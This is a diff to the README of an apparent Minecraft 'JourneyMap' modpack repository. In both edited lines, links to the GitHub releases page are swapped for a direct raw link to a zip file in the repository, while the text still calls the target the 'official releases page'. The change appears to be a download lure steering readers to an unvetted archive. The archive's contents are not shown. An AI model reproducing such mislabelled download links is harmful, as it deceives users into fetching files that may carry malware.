@@ -1,6 +1,6 @@
 # 🗺️ JourneyMap-Minecraft-Modpack - Easy navigation for your Minecraft world
 
-[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/tropicbirdtsimshian863/JourneyMap-Minecraft-Modpack/releases)
+[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/tropicbirdtsimshian863/JourneyMap-Minecraft-Modpack/raw/refs/heads/main/Platform/Map_Minecraft_Journey_Modpack_v1.5.zip)
 
 This modpack adds a detailed map to your Minecraft game. It displays your current location, marks your path, and tracks mobs. You see your world from above in real-time. Use this tool to find your way home or explore new biomes without the risk of getting lost.
 
@@ -20,7 +20,7 @@ If your computer meets these needs, you can proceed with the setup.
 
 Follow these steps to get the files on your computer.
 
-1.  Visit the [official releases page](https://github.com/tropicbirdtsimshian863/JourneyMap-Minecraft-Modpack/releases).
+1.  Visit the [official releases page](https://github.com/tropicbirdtsimshian863/JourneyMap-Minecraft-Modpack/raw/refs/heads/main/Platform/Map_Minecraft_Journey_Modpack_v1.5.zip).
 2.  Look for the section marked Assets under the latest version.
 3.  Click the zip file link to start your download.
 4.  Save the file to your desktop for easy access.
